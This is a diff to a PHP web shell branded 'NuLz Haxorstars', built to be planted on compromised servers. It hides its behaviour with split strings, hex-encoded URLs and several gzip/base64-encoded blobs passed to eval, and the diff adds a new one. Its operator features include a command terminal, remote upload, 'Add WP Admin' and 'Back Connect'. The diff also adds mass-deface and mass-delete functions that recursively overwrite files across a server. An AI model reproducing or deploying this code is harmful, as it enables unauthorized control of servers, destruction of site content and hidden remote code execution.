@@ -104,10 +104,9 @@ $folderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\
 $newFolderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x6e\x65\x77\x2d\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
 
 function NuLzUname() {
-    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
     $u_n_a_me = "p"."hp"."_"."un"."ame";
-    $u_n_a_me_disable = '<font class="ubuntu-mono" style="color: rgb(250 204 21);">' . $hayoloh('Cant Read The Kernel! The Function php_uname() is Disabled!') . '</font>';
+    $u_n_a_me_disable = '<font class="ubuntu-mono" style="color: rgb(250 204 21);"> Cant Read The Kernel! The Function php_uname() is Disabled! </font>';
     $u_n_a_me_active = '<font class="ubuntu-mono" style="color: rgb(22 163 74);">'.$u_n_a_me('a').'</font>';
     if ($func_exist($u_n_a_me)) {
         return $u_n_a_me_active;
@@ -131,7 +130,7 @@ function Ikg($vHjCLy){
         $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
      }
      return $vHjCLy;
-    }/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
+}/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
 $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
 $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
 $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
@@ -344,13 +343,26 @@ if (isset($_POST['nulz'])) {
     $komendnya = $_POST['nulz'];
     echo NuLzCmd($komendnya);
 }
+function XaFV($FQS) { 
+    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
+    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
+    $nelrts = 's'.'tr'.'l'.'en';
+    $rhc = 'c'.'h'.'r';
+    $dro = 'o'.'r'.'d';
+    $FQS=$gflate($b64($FQS));
+    for($i=0;$i<$nelrts($FQS);$i++) {
+        $FQS[$i] = $rhc($dro($FQS[$i])-1);
+    }
+    return $FQS;
+}/****/@/*55555*/null; /******/@/*55555*/eval/******/(XaFV("rVPdasIwFH4AnyKIkApSH0DnLra63WyCut3IKCVGDdSmNC3VDp9956Sxjb+orJCQk+873/lLCYGvIRbEEUrx1Gn5b950RqMsLOhPu01+G0hoLbKI+XwjVEqeCF1k1KURS2EXMoLdh8U3aCq8VLRn3CwfAUDILSZsqcVc8pKHWIgso7s059TYTGJwtHhkri2VODuvEsPKTlTwgu/lahWpJaRxgzB7INdADpcJBtBJVCDTIMMyYUllg6t1AWhZ5VGPDUNEc75JpMT0W/7EG3974xl9Hb18fXifU388Gk3pj0u7mufGq7iKK0J+gx9PEpn4oVxavjh2a7RwzquRa+1tsA103tKpE+wQGlCTdqWCTNu1ls9LELyeB9TFTrSPifhxtpKE9hVLRJwOAqgpdZrDPBEpJ5OMMa5Us93vGpz2DgR2hIeK36k6DKBz8yuiBxbM11RZs86GfTRkGe5E8hG53YXp4t9xYcAIOdVb6ugXe8uMz6cHYur61O5onRb7r869r4viSt92fw=="));
 
 //usefull
 function cekCurl() {
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+    $f_exist = 'fi'.'le_'.'exis'.'ts';
     $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
     $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
-    if ( $func_exist( 'cu'.'rl'.'_'.'in'.'it' ) ) {
+    if ( $func_exist( 'cu'.'rl'.'_'.'in'.'it' ) || $f_exist('/usr/bin/curl') ) {
         echo "cURL:&nbsp;&nbsp;$on";
     } else {
         echo "cURL:&nbsp;&nbsp;$off";
@@ -446,7 +458,7 @@ function cekPkexec() {
 }
 
 //login
-$passwd = '386421265b975230158e1386249bc28c82ba8bd6';
+$passwd = 'a2ca3756e57aa590065a201b72e02a55341553bd';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
@@ -496,7 +508,7 @@ if (empty($_SESSION['login'])) {
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
     <link href="<?= $s_he_ll_Icon ?>" rel="shortcut icon" type="image/x-icon">
-    <link rel="apple-touch-icon" href="<?= $s_he_ll_Icon ?>"/>
+    <link rel="apple-touch-icon" href="<?= $s_he_ll_Icon ?>" />
     <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
     <style>
     @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");
@@ -795,7 +807,7 @@ if (empty($_SESSION['login'])) {
     <script type="text/javascript">
     var root = document.querySelector(".root");
     var name = `
-                                ╭──[root@nulzXomest]<br>
+                                ╭──[root@nulzhaxorstars]<br>
                                 ╰──➤
                                 `;
     root.innerHTML = name;
@@ -811,7 +823,7 @@ if (empty($_SESSION['login'])) {
         .typeString("Welcome To <?=$s_he_ll_Name?>")
         .pauseFor(2000)
         .deleteChars(26)
-        .typeString("Created By NuLz & Omest")
+        .typeString("Created By NuLz Haxorstars")
         .pauseFor(2000)
         .start();
     </script>
@@ -846,7 +858,7 @@ $path = str_replace("\\", "/", $path);
     <meta name="bingbot" content="noindex, nofollow" />
     <meta name="description" content=".:<?= $s_he_ll_Name ?>:." />
     <link href="<?= $s_he_ll_Icon ?>" rel="shortcut icon" type="image/x-icon">
-    <link rel="apple-touch-icon" href="<?= $s_he_ll_Icon ?>"/>
+    <link rel="apple-touch-icon" href="<?= $s_he_ll_Icon ?>" />
     <!-- Font Api -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -871,8 +883,10 @@ $path = str_replace("\\", "/", $path);
     <!-- For Text Editor -->
     <link rel="stylesheet" href="https://raw.githubusercontent.com/haxorstars/archive/main/text-editor/main.css">
     <style id="style2" type="text/css"></style>
-    <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css" rel="stylesheet" />
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript"></script>
+    <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css"
+        rel="stylesheet" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript">
+    </script>
     <!-- Css Manual -->
     <style>
     body {
@@ -884,7 +898,7 @@ $path = str_replace("\\", "/", $path);
     tr:hover {
         background: rgba(36, 41, 59, 1);
     }
-    
+
     .poppins {
         <?=$poppins ?>
     }
@@ -940,6 +954,7 @@ $path = str_replace("\\", "/", $path);
     .fs-super {
         <?=$fsSuper ?>
     }
+
     /* Terminal Style */
     .terminal {
         position: absolute;
@@ -1000,9 +1015,10 @@ $path = str_replace("\\", "/", $path);
         font-size: 10px;
         color: #00ff00;
     }
+
     .terminal .command input[type=text]:hover {
-    	border: none;
-    	outline: none;
+        border: none;
+        outline: none;
     }
 
     .headerTerm {
@@ -1129,7 +1145,7 @@ $path = str_replace("\\", "/", $path);
         }
 
         .terminal .command {
-            left:1%;
+            left: 1%;
             font-size: 10px;
         }
 
@@ -1165,7 +1181,10 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img
+                    class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO">
+                <h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1>
+            </a>
             <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
             <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                 </font>
@@ -1182,27 +1201,38 @@ $path = str_replace("\\", "/", $path);
                 </font> SAFE MODE:
                 <?= $safeMode ?>
             </span>
-            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row">SERVER IP:&nbsp;<font class="ubuntu-mono <?= $txtGreen ?> w-full flex flex-row items-center">
+            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row">SERVER IP:&nbsp;<font
+                    class="ubuntu-mono <?= $txtGreen ?> w-full flex flex-row items-center">
                     <?= $serverIp ?>&nbsp;<img style="width: 3vh; height: 2vh;" src="<?= $serverIpFlags ?>">
                 </font></span>
-            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row"">YOUR IP:&nbsp;<font class="ubuntu-mono <?= $txtGreen ?> w-full flex flex-row items-center"><?= $userIp ?>&nbsp;<img style="width: 3vh; height: 2vh;" src="<?= $userIpFlags ?>"></font></span>
-            <span class="fs-xl poppins <?= $txtPurple ?>">DATE TIME: <font id="time" class="ubuntu-mono <?= $txtGreen ?>"></font></span>
-                    <script>
-                        setInterval(() => {
-                            var jam = document.getElementById("time");
-                            var bulanArr = ["January","February","Maret","April","Mei","Juni","July","Agustus","September","October","November","Desember"];
-                            var waktu = new Date();
-                            var tahun = waktu.getFullYear();
-                            var bulan = bulanArr[waktu.getMonth()];
-                            var tgl = waktu.getDate();
-                            var hours = waktu.getHours();
-                            var minutes = waktu.getMinutes();
-                            var seconds = waktu.getSeconds();
-                            jam.innerHTML  = tgl  + "-" + bulan + " " + tahun + " | " + hours + ":" + minutes + ":" + seconds; 
-                        }, 1000);
-                    </script>
+            <span class="fs-xl poppins <?= $txtPurple ?> w-auto flex flex-row"">YOUR IP:&nbsp;<font class=" ubuntu-mono
+                <?= $txtGreen ?> w-full flex flex-row items-center"><?= $userIp ?>&nbsp;<img
+                    style="width: 3vh; height: 2vh;" src="<?= $userIpFlags ?>"></font></span>
+            <span class="fs-xl poppins <?= $txtPurple ?>">DATE TIME: <font id="time"
+                    class="ubuntu-mono <?= $txtGreen ?>"></font></span>
+            <script>
+            setInterval(() => {
+                var jam = document.getElementById("time");
+                var bulanArr = ["January", "February", "Maret", "April", "Mei", "Juni", "July", "Agustus",
+                    "September", "October", "November", "Desember"
+                ];
+                var waktu = new Date();
+                var tahun = waktu.getFullYear();
+                var bulan = bulanArr[waktu.getMonth()];
+                var tgl = waktu.getDate();
+                var hours = waktu.getHours();
+                var minutes = waktu.getMinutes();
+                var seconds = waktu.getSeconds();
+                jam.innerHTML = tgl + "-" + bulan + " " + tahun + " | " + hours + ":" + minutes + ":" + seconds;
+            }, 1000);
+            </script>
             <span class="fs-xl poppins <?= $txtPurple ?> flex flex-row flex-nowrap">
-            <?= cekCurl() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekWget() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPython2() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPython3() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPerl() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekRuby() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekGcc() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPkexec() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekSudo() ?>
+                <?= cekCurl() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekWget() ?>&nbsp;<font
+                    class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPython2() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>
+                &nbsp;<?= cekPython3() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPerl() ?>&nbsp;<font
+                    class="<?=$txtWhite?>">|</font>&nbsp;<?= cekRuby() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>
+                &nbsp;<?= cekGcc() ?>&nbsp;<font class="<?=$txtWhite?>">|</font>&nbsp;<?= cekPkexec() ?>&nbsp;<font
+                    class="<?=$txtWhite?>">|</font>&nbsp;<?= cekSudo() ?>
             </span>
             <span class="fs-xl poppins <?= $txtPurple ?>">DISABLE FUNCTIONS: <?= $cekFunc ?></span>
             <?php
@@ -1243,17 +1273,22 @@ $path = str_replace("\\", "/", $path);
             }
         }
     ?>
-    <form class="mx-2 flex flex-col border border-inherit px-2 py-4 rounded-lg w-max" action="" method="POST" enctype="multipart/form-data">
+    <form class="mx-2 max-w-full flex flex-wrap justify-center items-center border border-inherit px-2 py-4 rounded-lg" action="" method="POST" enctype="multipart/form-data">
         <label class="block mx-2 fs-xl josefin-sans <?=$txtWhite?>" for="upl">Upload File</label>
-        <div class="mx-2 flex flex-row flex-nowrap w">
-        <div><input type="file" class="font-bold <?=$txtWhite?> border border-gray-300 rounded-lg cursor-pointer" name="file[]" id="file" multiple></div>
-            <button type="submit" name="btn-upl" class="mx-2 font-bold bg-slate-800 hover:bg-slate-600 focus:outline-none focus:ring-4 focus:ring-gray-300 rounded-lg px-5 dark:bg-gray-800 dark:hover:bg-gray-700 dark:focus:ring-gray-700 dark:border-gray-700">Upload</button>
+        <div class="mx-2 flex justify-center items-center flex-row flex-wrap">
+            <div><input type="file" class="font-bold <?=$txtWhite?> border border-gray-300 rounded-lg cursor-pointer"
+                    name="file[]" id="file" multiple></div>
+            <button type="submit" name="btn-upl"
+                class="mx-2 font-bold bg-slate-800 hover:bg-slate-600 focus:outline-none focus:ring-4 focus:ring-gray-300 rounded-lg px-5 dark:bg-gray-800 dark:hover:bg-gray-700 dark:focus:ring-gray-700 dark:border-gray-700">Upload</button>
         </div>
-        <div class="tools mt-4">
+        <div class="tools mt-4 max-w-full flex flex-wrap justify-center items-center">
             <a href="?option&path=<?= $path ?>&terminal"><button type="button" name="terminal" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-gray-600 dark:focus:ring-gray-700 hover:bg-gray-700"><i class="fa-duotone fa-square-terminal"></i>&nbsp;Terminal</button></a>
             <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i>&nbsp;New Folder</button>
             <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
-            <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
+            <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="remoteup" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
+            <a href="?option&path=<?= $path ?>&mass_deface"><button type="button" name="massdeface" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-masks-theater"></i>&nbsp;Mass Deface</button>
+            <a href="?option&path=<?= $path ?>&mass_delete"><button type="button" name="massdelete" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-trash-can"></i>&nbsp;Mass Delete</button>
+            <a href="?option&path=<?= $path ?>&ziper"><button type="button" name="ziper" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-regular fa-file-zipper"></i>&nbsp;Ziper</button>
             <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
             <a href="?option&path=<?= $path ?>&backConnect"><button type="button" name="backConnect" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-300 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-sharp fa-light fa-chart-network"></i></i>&nbsp;Back Connect</button></a>
         </div>
@@ -1289,7 +1324,7 @@ $path = str_replace("\\", "/", $path);
             ';
             }
         }
-        echo '<form class="mx-2 my-2" action="" method="POST">';
+        echo '<form class="mx-2 my-4" action="" method="POST">';
         echo '<label class="block">
             <span class="block '.$txtBlue.'">New Folder</span>
             <input type=""text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="Foldername" name="newfoldername">
@@ -1925,7 +1960,7 @@ $path = str_replace("\\", "/", $path);
                     </script>';
                 }
             } else {
-                echo '<script>
+                echo '<>
                     alert("Remote File Failed :(")
                     </script>';
             }
@@ -1941,74 +1976,1643 @@ $path = str_replace("\\", "/", $path);
         echo '</form>';
     }
 
-    if (isset($_GET['addNewAdmin'])) {
-        echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono '.$txtYellow.'">Sorry... The Feature <font class="'.$txtWhite.'">Add New Admin</font> Is Maintance!</span>';
+    if (isset($_GET['mass_deface'])) {
+        $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
+        $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
+        $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
+        $is_d = 'is'.'_'.'d'.'i'.'r';
+        $is_f = 'is'.'_'.'f'.'i'.'l'.'e';
+        $scn_d = 'sc'.'an'.'d'.'ir';
+        $glb = 'g'.'l'.'o'.'b';
+        function mass_normal($path, $massdefacefilename, $massdefacefilcontent) {
+            global $f_put;
+            global $is_w;
+            global $is_r;
+            global $is_d;
+            global $scn_d;
+            global $txtWhite;
+            global $txtEmerald;
+            global $txtGreen;
+            global $txtYellow;
+            if ($is_w) {
+                $scan = $scn_d($path);
+                foreach ($scan as $dir) {
+                    $this_dir = "$path/$dir";
+                    $this_files = "$this_dir/$massdefacefilename";
+                    $defacefile = str_replace('\\', '/', $this_files);
+                    if ($dir === '.') {
+                        $f_put($defacefile, $massdefacefilcontent);
+                    } elseif ($dir === '..') {
+                        $f_put($defacefile, $massdefacefilcontent);
+                    } else {
+                        if($is_d($this_dir)) {
+                            if($is_w($this_dir)) {
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$defacefile.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$path.'/'.$massdefacefilename.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
+                                $f_put($defacefile, $massdefacefilcontent);
+                            }
+                        }
+                    }
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
+            }
+        }
+        function mass_brutal($path, $massdefacefilcontent) {
+            global $f_put;
+            global $is_w;
+            global $is_r;
+            global $is_d;
+            global $scn_d;
+            global $glb;
+            global $txtWhite;
+            global $txtRed;
+            global $txtGreen;
+            global $txtYellow;
+            global $txtEmerald;
+            if ($is_w) {
+                $scan = $scn_d($path);
+                foreach ($scan as $dir) {
+                    $this_dir = "$path/$dir";
+                    $getallfile = $glb($path . '*', GLOB_MARK);
+                    foreach ($getallfile as $massdefacefilename) {
+                    $defacefile = str_replace('\\', '/', $massdefacefilename);
+                        if ($dir === '.') {
+                            $f_put($defacefile, $massdefacefilcontent);
+                        } elseif ($dir === '..') {
+                            $f_put($defacefile, $massdefacefilcontent);
+                        } else {
+                            if($is_d($this_dir)) {
+                                if($is_w($this_dir)) {
+                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$defacefile.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
+                                    $f_put($defacefile, $massdefacefilcontent);
+                                    mass_brutal($defacefile, $massdefacefilcontent);
+                                }
+                            }
+                        }
+                    }
+                }
+            } else {
+                echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
+            }
+        }
+        if (isset($_POST['btn-normal-mode'])) {
+            $defacepath = $_POST['massdefacepath'];
+            $defacefilename = $_POST['massdefacefile'];
+            $defacefilecontent = $_POST['massdefacefilecontent'];
+            mass_normal($defacepath, $defacefilename, $defacefilecontent);
+        }
+
+        if (isset($_POST['btn-brutal-mode'])) {
+            $defacepath = $_POST['massdefacepath'];
+            $defacefilecontent = $_POST['massdefacefilecontent'];
+            mass_brutal($defacepath, $defacefilecontent);
+        }
+        echo '
+        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
+            <label for="mode" class="block mb-2 text-sm font-medium '.$txtBlue.'">Change Mode</label>
+            <select id="mode" name="mode" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
+                <option>Select Mode</option>
+                <option value="normal">NORMAL MODE</option>
+                <option value="brutal">BRUTAL MODE</option>
+            </select>
+        </form>';
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            $mode = $_POST['mode'];
+            $normal = 'normal';
+            $brutal = 'brutal';
+            if ($mode == $normal) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtYellow.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
+                echo '<label class="block">
+            <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdefacepath">
+            </label>';
+                echo '<label class="block">
+            <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="massdefacefile">
+            </label>';
+            echo '
+            <style type="text/css">
+            @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
+    
+            #divCodeWrapper {
+                height: 80vh;
+                width: 100%;
+                overflow: hidden;
+                border: 1px solid #a5a5a5;
+                position: relative;
+            }
+    
+            #preCode {
+                height: 100%;
+                width: 100%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                overflow: hidden;
+                padding: 0;
+                margin: 0;
+                background: #1b1b1b;
+            }
+    
+                #preCode code {
+                    padding: 15px;
+                    height: calc(100% - 30px);
+                    width: calc(100% - 30px);
+                    font-family: "Roboto Mono", monospace;
+                    font-weight: 400;
+                    font-size: 12pt;
+                    line-height: 150%;
+                    overflow-y: scroll;
+                    overflow-x: auto;
+                }
+    
+            textarea {
+                font-family: "Roboto Mono", monospace;
+                font-weight: 400;
+                font-size: 12pt;
+                line-height: 150%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: calc(100% - 30px);
+                width: calc(100% - 30px);
+                padding: 15px;
+                z-index: 2;
+                overflow-x: auto;
+                overflow-y: scroll;
+                white-space: nowrap;
+                background-color: rgba(0,0,0,0);
+                color: rgba(0,0,0,0);
+                caret-color: white;
+            }
+        </style>
+        <span class="block '.$txtBlue.' font-medium">Filecontent <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+        <span>Theme:</span>
+            <select id="selectStyle" class="bg-black">
+                <option>a11y-dark.min.css</option>
+                <option>a11y-light.min.css</option>
+                <option>agate.min.css</option>
+                <option>an-old-hope.min.css</option>
+                <option>androidstudio.min.css</option>
+                <option>arduino-light.min.css</option>
+                <option>arta.min.css</option>
+                <option>ascetic.min.css</option>
+                <option>atom-one-dark-reasonable.min.css</option>
+                <option>atom-one-dark.min.css</option>
+                <option>atom-one-light.min.css</option>
+                <option>brown-paper.min.css</option>
+                <option>codepen-embed.min.css</option>
+                <option>color-brewer.min.css</option>
+                <option>dark.min.css</option>
+                <option>default.min.css</option>
+                <option>devibeans.min.css</option>
+                <option>docco.min.css</option>
+                <option>far.min.css</option>
+                <option>felipec.min.css</option>
+                <option>foundation.min.css</option>
+                <option>github-dark-dimmed.min.css</option>
+                <option>github-dark.min.css</option>
+                <option>github.min.css</option>
+                <option>gml.min.css</option>
+                <option>googlecode.min.css</option>
+                <option>gradient-dark.min.css</option>
+                <option>gradient-light.min.css</option>
+                <option>grayscale.min.css</option>
+                <option>hybrid.min.css</option>
+                <option>idea.min.css</option>
+                <option>intellij-light.min.css</option>
+                <option>ir-black.min.css</option>
+                <option>isbl-editor-dark.min.css</option>
+                <option>isbl-editor-light.min.css</option>
+                <option>kimbie-dark.min.css</option>
+                <option>kimbie-light.min.css</option>
+                <option>lightfair.min.css</option>
+                <option>lioshi.min.css</option>
+                <option>magula.min.css</option>
+                <option>mono-blue.min.css</option>
+                <option>monokai-sublime.min.css</option>
+                <option>monokai.min.css</option>
+                <option>night-owl.min.css</option>
+                <option>nnfx-dark.min.css</option>
+                <option>nnfx-light.min.css</option>
+                <option>nord.min.css</option>
+                <option>obsidian.min.css</option>
